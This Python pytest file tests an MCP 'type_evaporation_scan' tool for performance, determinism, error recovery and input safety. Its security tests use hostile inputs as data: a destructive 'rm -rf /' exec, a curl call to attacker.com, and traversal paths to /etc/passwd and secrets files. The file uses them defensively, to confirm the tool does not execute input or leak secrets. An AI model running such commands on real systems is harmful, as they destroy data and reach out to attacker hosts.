"""
Phase 5 Quality Attributes
Tests for performance baselines, security validation, error recovery.
Validates non-functional requirements.
"""

from __future__ import annotations

import time
from datetime import timedelta
from pathlib import Path

import pytest

from tests.mcp.test_tier_boundary_limits import (
    _assert_envelope,
    _stdio_session,
    _tool_json,
)

pytestmark = [pytest.mark.asyncio]


# =============================================================================
# Section 4: Quality Attributes - Performance & Security
# =============================================================================


async def test_performance_small_input(tmp_path: Path):
    """Test performance with small input."""
    frontend_code = "const x = fetch('/api');"
    backend_code = "x = requests.get('/api')"

    async with _stdio_session(project_root=tmp_path) as session:
        start = time.time()
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
            },
            read_timeout_seconds=timedelta(seconds=120),
        )
        elapsed = time.time() - start

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Small input should process quickly (< 5 seconds)
    assert elapsed < 5, f"Small input took {elapsed}s"
    assert data.get("success") in [True, False]


async def test_performance_medium_input(tmp_path: Path):
    """Test performance with medium input (100+ functions)."""
    frontend_code = "\n".join([f"const func{i} = () => fetch('/api/users/{i}');" for i in range(100)])
    backend_code = "\n".join([f"def func{i}(): return requests.get('/api/users/{i}')" for i in range(100)])

    async with _stdio_session(project_root=tmp_path) as session:
        start = time.time()
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
            },
            read_timeout_seconds=timedelta(seconds=120),
        )
        elapsed = time.time() - start

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Medium input should complete in reasonable time (< 30 seconds)
    assert elapsed < 30, f"Medium input took {elapsed}s"
    assert data.get("success") in [True, False]


async def test_deterministic_execution(tmp_path: Path):
    """Test that same input produces consistent results."""
    frontend_code = """
const userId = getUserIdFromInput();
const url = `/api/users/${userId}`;
fetch(url);
"""
    backend_code = """
user_id = request.args.get('id')
response = requests.get(f'/api/users/{user_id}')
"""

    results = []
    for _ in range(2):
        async with _stdio_session(project_root=tmp_path) as session:
            payload = await session.call_tool(
                "type_evaporation_scan",
                arguments={
                    "frontend_code": frontend_code,
                    "backend_code": backend_code,
                },
                read_timeout_seconds=timedelta(seconds=120),
            )

        env_json = _tool_json(payload)
        data = _assert_envelope(env_json, tool_name="type_evaporation_scan")
        results.append(data.get("success"))

    # Should produce same result twice
    assert results[0] == results[1]


async def test_security_no_code_execution(tmp_path: Path):
    """Test that tool doesn't execute code from input."""
    frontend_code = """
const x = require('child_process').exec('rm -rf /')
"""
    backend_code = """
import subprocess
subprocess.run(['curl', 'http://attacker.com'])
"""

    async with _stdio_session(project_root=tmp_path) as session:
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Should analyze without executing
    assert isinstance(data, dict)
    assert data.get("success") in [True, False]


async def test_security_no_secret_leakage(tmp_path: Path):
    """Test that secrets don't leak in output."""
    secret_api_key = "sk-1234567890abcdefghijklmnop"
    frontend_code = f"""
const apiKey = "{secret_api_key}";
const request = fetch('/api/data', {{
    headers: {{ Authorization: `Bearer ${{apiKey}}` }}
}});
"""
    backend_code = f"""
api_key = "{secret_api_key}"
response = requests.get('/api/data', headers={{'Authorization': f'Bearer {{api_key}}'}})
"""

    async with _stdio_session(project_root=tmp_path) as session:
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json = _tool_json(payload)
    _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Secret should not leak in response
    response_str = str(payload)
    assert secret_api_key not in response_str


async def test_error_recovery_from_invalid_input(tmp_path: Path):
    """Test recovery from invalid input."""
    async with _stdio_session(project_root=tmp_path) as session:
        # Send invalid input
        payload1 = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": "<<<INVALID>>>",
                "backend_code": "<<<ALSO INVALID>>>",
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

        # Send valid input
        payload2 = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": "const x = 1;",
                "backend_code": "x = 1",
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json1 = _tool_json(payload1)
    env_json2 = _tool_json(payload2)

    # Both should complete
    data1 = _assert_envelope(env_json1, tool_name="type_evaporation_scan")
    data2 = _assert_envelope(env_json2, tool_name="type_evaporation_scan")

    assert isinstance(data1, dict)
    assert isinstance(data2, dict)


async def test_graceful_oversized_input(tmp_path: Path):
    """Test graceful handling of very large input."""
    # Create input with 10000 properties
    huge_code = "const obj = { " + ", ".join([f"key{i}: {i}" for i in range(5000)]) + " };"

    async with _stdio_session(project_root=tmp_path) as session:
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": huge_code,
                "backend_code": "x = 1",
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Should handle gracefully
    assert isinstance(data, dict)


async def test_unicode_handling(tmp_path: Path):
    """Test Unicode character handling."""
    frontend_code = 'const message = "Hello 世界 مرحبا"; fetch("/api");'
    backend_code = 'message = "Hello 世界 مرحبا"; requests.get("/api")'

    async with _stdio_session(project_root=tmp_path) as session:
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Should handle Unicode without issues
    assert data.get("success") in [True, False]


async def test_path_traversal_safety(tmp_path: Path):
    """Test that path traversal in filenames doesn't bypass safety."""
    frontend_code = "const x = 1;"
    backend_code = "x = 1"

    async with _stdio_session(project_root=tmp_path) as session:
        payload = await session.call_tool(
            "type_evaporation_scan",
            arguments={
                "frontend_code": frontend_code,
                "backend_code": backend_code,
                "frontend_file": "../../../etc/passwd",
                "backend_file": "../../secrets.py",
            },
            read_timeout_seconds=timedelta(seconds=120),
        )

    env_json = _tool_json(payload)
    data = _assert_envelope(env_json, tool_name="type_evaporation_scan")

    # Should process safely
    assert isinstance(data, dict)
